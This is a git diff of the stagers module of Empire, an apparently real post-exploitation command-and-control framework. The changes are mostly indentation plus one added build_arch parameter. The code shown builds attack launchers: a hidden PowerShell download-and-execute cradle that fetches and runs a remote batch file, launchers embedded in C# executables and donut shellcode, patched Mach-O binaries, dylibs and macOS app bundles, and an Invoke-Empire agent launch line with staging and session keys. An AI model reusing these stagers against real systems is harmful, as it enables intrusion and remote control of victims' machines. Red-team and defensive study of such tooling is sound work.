@@ -31,7 +31,6 @@ from empire.server.core.db import models
 from empire.server.core.db.base import SessionLocal
 from empire.server.utils import data_util
 from empire.server.utils.math_util import old_div
-
 from . import helpers
 
 log = logging.getLogger(__name__)
@@ -43,17 +42,17 @@ class Stagers(object):
         self.args = args
 
     def generate_launcher_fetcher(
-        self,
-        language=None,
-        encode=True,
-        webFile="http://127.0.0.1/launcher.bat",
-        launcher="powershell -noP -sta -w 1 -enc ",
+            self,
+            language=None,
+            encode=True,
+            webFile="http://127.0.0.1/launcher.bat",
+            launcher="powershell -noP -sta -w 1 -enc ",
     ):
         # TODO add handle for other than powershell language
         stager = (
-            'wget "'
-            + webFile
-            + '" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
+                'wget "'
+                + webFile
+                + '" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
         )
         if encode:
             return helpers.powershell_launcher(stager, launcher)
@@ -61,18 +60,19 @@ class Stagers(object):
             return stager
 
     def generate_launcher(
-        self,
-        listenerName,
-        language=None,
-        encode=True,
-        obfuscate=False,
-        obfuscation_command="",
-        userAgent="default",
-        proxy="default",
-        proxyCreds="default",
-        stagerRetries="0",
-        safeChecks="true",
-        bypasses: str = "",
+            self,
+            listenerName,
+            language=None,
+            encode=True,
+            obfuscate=False,
+            obfuscation_command="",
+            userAgent="default",
+            proxy="default",
+            proxyCreds="default",
+            stagerRetries="0",
+            safeChecks="true",
+            bypasses: str = "",
+            build_arch: str = ""
     ):
         """
         Abstracted functionality that invokes the generate_launcher() method for a given listener,
@@ -140,9 +140,9 @@ class Stagers(object):
                 searchString = (("Invoke-Replace").encode("UTF-16"))[2:]
                 index = dllRaw.find(searchString)
                 dllPatched = (
-                    dllRaw[:index]
-                    + replacementCode
-                    + dllRaw[(index + len(replacementCode)) :]
+                        dllRaw[:index]
+                        + replacementCode
+                        + dllRaw[(index + len(replacementCode)):]
                 )
 
                 return dllPatched
@@ -151,7 +151,7 @@ class Stagers(object):
             log.error(f"Original .dll for arch {arch} does not exist!")
 
     def generate_powershell_exe(
-        self, posh_code, dot_net_version="net40", obfuscate=False
+            self, posh_code, dot_net_version="net40", obfuscate=False
     ):
         """
         Generate powershell launcher embedded in csharp
@@ -162,9 +162,9 @@ class Stagers(object):
 
         # Write text file to resources to be embedded
         with open(
-            self.mainMenu.installPath
-            + "/csharp/Covenant/Data/EmbeddedResources/launcher.txt",
-            "w",
+                self.mainMenu.installPath
+                + "/csharp/Covenant/Data/EmbeddedResources/launcher.txt",
+                "w",
         ) as f:
             f.write(posh_code)
 
@@ -180,7 +180,7 @@ class Stagers(object):
         return directory
 
     def generate_powershell_shellcode(
-        self, posh_code, arch="both", dot_net_version="net40"
+            self, posh_code, arch="both", dot_net_version="net40"
     ):
         """
         Generate powershell shellcode using donut python module
@@ -197,7 +197,7 @@ class Stagers(object):
         return shellcode
 
     def generate_exe_oneliner(
-        self, language, obfuscate, obfuscation_command, encode, listener_name
+            self, language, obfuscate, obfuscation_command, encode, listener_name
     ):
         """
         Generate a oneliner for a executable
@@ -234,7 +234,7 @@ class Stagers(object):
             )
         # base64 encode the stager and return it
         if encode and (
-            (not obfuscate) or ("launcher" not in obfuscation_command.lower())
+                (not obfuscate) or ("launcher" not in obfuscation_command.lower())
         ):
             return helpers.powershell_launcher(launcher, launcher_front)
         else:
@@ -242,7 +242,7 @@ class Stagers(object):
             return launcher
 
     def generate_python_exe(
-        self, python_code, dot_net_version="net40", obfuscate=False
+            self, python_code, dot_net_version="net40", obfuscate=False
     ):
         """
         Generate ironpython launcher embedded in csharp
@@ -253,9 +253,9 @@ class Stagers(object):
 
         # Write text file to resources to be embedded
         with open(
-            self.mainMenu.installPath
-            + "/csharp/Covenant/Data/EmbeddedResources/launcher.txt",
-            "w",
+                self.mainMenu.installPath
+                + "/csharp/Covenant/Data/EmbeddedResources/launcher.txt",
+                "w",
         ) as f:
             f.write(python_code)
 
@@ -271,7 +271,7 @@ class Stagers(object):
         return directory
 
     def generate_python_shellcode(
-        self, posh_code, arch="both", dot_net_version="net40"
+            self, posh_code, arch="both", dot_net_version="net40"
     ):
         """
         Generate ironpython shellcode using donut python module
@@ -295,7 +295,7 @@ class Stagers(object):
         MH_EXECUTE = 2
         # with open(self.installPath + "/data/misc/machotemplate", 'rb') as f:
         with open(
-            "%s/data/misc/machotemplate" % (self.mainMenu.installPath), "rb"
+                "%s/data/misc/machotemplate" % (self.mainMenu.installPath), "rb"
         ) as f:
             macho = macholib.MachO.MachO(f.name)
 
@@ -310,17 +310,17 @@ class Stagers(object):
                 if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64:
                     count += 1
                     if (
-                        cmd[count].segname.strip(b"\x00") == b"__TEXT"
-                        and cmd[count].nsects > 0
+                            cmd[count].segname.strip(b"\x00") == b"__TEXT"
+                            and cmd[count].nsects > 0
                     ):
                         count += 1
                         for section in cmd[count]:
                             if section.sectname.strip(b"\x00") == b"__cstring":
                                 offset = int(section.offset) + (
-                                    int(section.size) - 2119
+                                        int(section.size) - 2119
                                 )
                                 placeHolderSz = int(section.size) - (
-                                    int(section.size) - 2119
+                                        int(section.size) - 2119
                                 )
 
             template = f.read()
@@ -333,7 +333,7 @@ class Stagers(object):
             launcherCode = base64.urlsafe_b64encode(launcherCode.encode("utf-8"))
             launcher = launcherCode + b"\x00" * (placeHolderSz - len(launcherCode))
             patchedMachO = (
-                template[:offset] + launcher + template[(offset + len(launcher)) :]
+                    template[:offset] + launcher + template[(offset + len(launcher)):]
             )
 
             return patchedMachO
@@ -384,13 +384,13 @@ class Stagers(object):
         for cmd in cmds:
             count = 0
             if (
-                int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64
-                or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT
+                    int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64
+                    or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT
             ):
                 count += 1
                 if (
-                    cmd[count].segname.strip(b"\x00") == b"__TEXT"
-                    and cmd[count].nsects > 0
+                        cmd[count].segname.strip(b"\x00") == b"__TEXT"
+                        and cmd[count].nsects > 0
                 ):
                     count += 1
                     for section in cmd[count]:
@@ -405,7 +405,7 @@ class Stagers(object):
             if isinstance(launcher, str):
                 launcher = launcher.encode("UTF-8")
             patchedDylib = b"".join(
-                [template[:offset], launcher, template[(offset + len(launcher)) :]]
+                [template[:offset], launcher, template[(offset + len(launcher)):]]
             )
 
             return patchedDylib
@@ -425,8 +425,8 @@ class Stagers(object):
                 "rb",
             )
             directory = (
-                self.mainMenu.installPath
-                + "/data/misc/apptemplateResources/x64/launcher.app/"
+                    self.mainMenu.installPath
+                    + "/data/misc/apptemplateResources/x64/launcher.app/"
             )
         else:
             f = open(
@@ -435,8 +435,8 @@ class Stagers(object):
                 "rb",
             )
             directory = (
-                self.mainMenu.installPath
-                + "/data/misc/apptemplateResources/x86/launcher.app/"
+                    self.mainMenu.installPath
+                    + "/data/misc/apptemplateResources/x86/launcher.app/"
             )
 
         macho = macholib.MachO.MachO(f.name)
@@ -450,13 +450,13 @@ class Stagers(object):
         for cmd in cmds:
             count = 0
             if (
-                int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64
-                or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT
+                    int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64
+                    or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT
             ):
                 count += 1
                 if (
-                    cmd[count].segname.strip(b"\x00") == b"__TEXT"
-                    and cmd[count].nsects > 0
+                        cmd[count].segname.strip(b"\x00") == b"__TEXT"
+                        and cmd[count].nsects > 0
                 ):
                     count += 1
                     for section in cmd[count]:
@@ -469,10 +469,10 @@ class Stagers(object):
 
         if placeHolderSz and offset:
             launcher = launcherCode.encode("utf-8") + b"\x00" * (
-                placeHolderSz - len(launcherCode)
+                    placeHolderSz - len(launcherCode)
             )
             patchedBinary = (
-                template[:offset] + launcher + template[(offset + len(launcher)) :]
+                    template[:offset] + launcher + template[(offset + len(launcher)):]
             )
             if AppName == "":
                 AppName = "launcher"
@@ -788,8 +788,8 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
 
             if options["Language"]["Value"] == "powershell":
                 launch_code = (
-                    "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';"
-                    % (host, staging_key, session_key, session_id)
+                        "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';"
+                        % (host, staging_key, session_key, session_id)
                 )
                 full_agent = comms_code + "\n" + agent_code + "\n" + launch_code
                 return full_agent
